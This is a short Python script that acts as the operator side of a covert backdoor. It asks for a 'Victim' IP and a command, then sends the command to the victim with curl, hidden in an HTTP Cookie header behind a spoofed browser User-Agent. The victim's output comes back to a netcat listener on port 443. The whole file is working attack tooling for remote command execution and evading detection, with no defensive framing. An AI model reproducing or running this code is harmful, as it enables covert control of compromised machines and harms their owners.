#!/usr/bin/python3
from scapy.all import IP, TCP, Raw, sniff
import threading
from os import system, popen
from time import sleep
RETURN_PORT = 443

def get_IF_NAME():
    tokens = popen("ip route | grep default", 'r').read().split(" ")
    return tokens[tokens.index("dev")+1]

caught = False
def catch_response():
    global caught
    print(popen(f"nc -nlp {RETURN_PORT}").read())
    caught = True

def send_command(vic_ip, cmd):
    print(vic_ip, cmd)
    # print(f"curl {vic_ip} -A \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/420.69 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\" -H \"Cookie: {cmd}\" -H \"Upgrade-Insecure-Requests: {RETURN_PORT}\" > /dev/null 2>&1")
    system(f"curl {vic_ip} -A \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/420.69 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\" -H \"Cookie: {cmd}\" -H \"Upgrade-Insecure-Requests: {RETURN_PORT}\" > /dev/null 2>&1")

def main():
    vic_ip = input("Victim: ")
    command = input("Command: ")

    # Start sniffing in a separate thread
    sniffing_thread = threading.Thread(target=catch_response, args=(), daemon=False)
    sniffing_thread.start()

    send_command(vic_ip, command)

    while not caught:
        sleep(0.1)
    sniffing_thread.join()
    # Send the command to the victim IP

if __name__ == "__main__":
    main()